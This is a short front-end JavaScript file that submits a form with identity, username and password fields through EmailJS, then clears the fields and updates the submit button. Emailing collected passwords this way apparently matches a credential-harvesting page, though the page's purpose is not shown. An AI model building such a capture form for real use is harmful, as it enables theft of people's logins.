let subscribe = document.getElementById('submit')
let id = document.getElementById('identity')
let username = document.getElementById('username')
let password = document.getElementById('password')

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_ebi","template_ebi", this)
        .then(function() {
            console.log('SUCCESS!');
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            id.value = "";
            username.value = "";
                password.value ="";
                let Subscribe = setTimeout(sub, 5000);
                function sub(){
                    subscribe.value = 'Submit'
                }
            }, function(error) {
                console.log('FAILED...', error);
                let input = document.querySelectorAll('input')
                input.innerHTML = ""
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                let Subscribe = setTimeout(sub, 4000);
                function sub(){
                    subscribe.value = 'Submit'
                }
            });
    });
}